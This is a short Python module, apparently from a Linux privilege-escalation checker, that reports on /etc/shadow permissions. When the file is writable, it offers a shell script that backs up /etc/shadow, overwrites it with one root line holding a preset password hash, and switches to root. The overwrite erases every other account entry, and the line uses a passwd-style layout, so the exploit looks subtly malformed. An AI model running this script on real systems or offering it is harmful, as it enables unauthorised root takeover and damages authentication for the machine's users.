script = """
cp /etc/shadow /tmp/shadow.bac
echo 'root:$6$XYve5DPaJ07W8hah$bUwkQVpAbuOpZNgL/EGbV55WPSKKWKr4fakGWHQJNDOkFCmSlEyZ7jwSgGAhhUeAiBYh8ceDSaJfGSyCS6gnU1:0:0:root:/root:/bin/bash' > /etc/shadow
su root # password
"""

def shadowResults(message):
  if message.strip().lower() == "write":
    return {
      "title": "/etc/shadow File",
      "results": [{
        "message": "The /etc/shadow file has write permission",
        "scripts": [ script ]
      }]
    }
  
  if message.strip().lower() == "read":
    return {
      "title": "/etc/shadow File",
      "results": [{
        "message": "The /etc/shadow file has read permission",
        "scripts": []
      }]
    }

  return ""
